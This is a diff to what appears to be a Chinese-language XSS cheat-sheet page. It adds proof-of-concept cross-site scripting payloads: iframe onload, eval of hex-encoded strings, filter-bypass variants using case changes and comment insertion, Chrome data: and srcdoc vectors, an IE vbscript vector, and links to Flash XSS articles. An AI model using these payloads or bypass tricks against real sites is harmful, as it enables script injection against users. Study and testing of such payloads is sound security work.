@@ -25,6 +25,7 @@
 <p><a href="http://html5sec.org/">HTML5 Security Cheatsheet</a></p>
 <div class="hlcode"><pre><span class="nt">&lt;script&gt;</span>alert(1);<span class="nt">&lt;/script&gt;</span>
 <span class="nt">&lt;script&gt;</span>alert(&#39;xss&#39;);<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;iframe</span> <span class="na">onload=</span><span class="s">&quot;alert(1)&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
 </pre></div>
 
 
@@ -175,6 +176,22 @@
 </pre></div>
 
 
+<ul>
+<li>eval</li>
+</ul>
+<div class="hlcode"><pre><span class="nt">&lt;script&gt;</span>
+eval(&quot;alert(&#39;xss&#39;)&quot;);
+<span class="nt">&lt;/script&gt;</span>
+
+# eval 执行十六进制字符串形式
+<span class="nt">&lt;script&gt;</span>
+eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;);
+<span class="nt">&lt;/script&gt;</span>
+
+# eval 执行10进制形式，需要 String.fromCharCode() 配合使用
+</pre></div>
+
+
 <h2 id="_1">常见绕过</h2>
 <div class="hlcode"><pre><span class="cp"># 大小写转换</span>
 <span class="o">&lt;</span><span class="n">IMG</span> <span class="n">sRc</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;alert(/xss/)&quot;</span><span class="o">&gt;</span>
@@ -187,6 +204,39 @@
 <span class="cp"># </span><span class="cm">/**/</span><span class="cp"></span>
 <span class="o">&lt;</span><span class="n">img</span><span class="cm">/**/</span><span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span><span class="cm">/**/</span><span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="o">/</span><span class="n">xss</span><span class="o">/</span><span class="p">)</span><span class="o">&gt;</span>
 </pre></div>
+
+
+<h2 id="_2">浏览器特性</h2>
+<h3 id="chrome">chrome</h3>
+<ul>
+<li>Chrome下data协议执行代码</li>
+</ul>
+<div class="hlcode"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>Chrome下srcdoc属性</li>
+</ul>
+<div class="hlcode"><pre><span class="nt">&lt;iframe</span> <span class="na">srcdoc=</span><span class="s">&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</pre></div>
+
+
+<h3 id="ie">IE</h3>
+<ul>
+<li>IE下vbscript执行代码</li>
+</ul>
+<div class="hlcode"><pre><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">&quot;vbscript:msgbox(1)&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span> 
+</pre></div>
+
+
+<h2 id="flash">flash</h2>
+<p><a href="https://www.free-decompiler.com/flash/download/">swf反编译软件下载</a></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-016512"> 乌云 Flash Xss入门--navigateToURL</a>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-016532"> 乌云 Flash Xss进阶--ExternalInterface.call(1)</a>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-016598"> 乌云 Flash Xss进阶--ExternalInterface.call(2)</a>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-016803"> 乌云 Flash Xss进阶--addCallback</a></p>
 </div>
 
         </div>
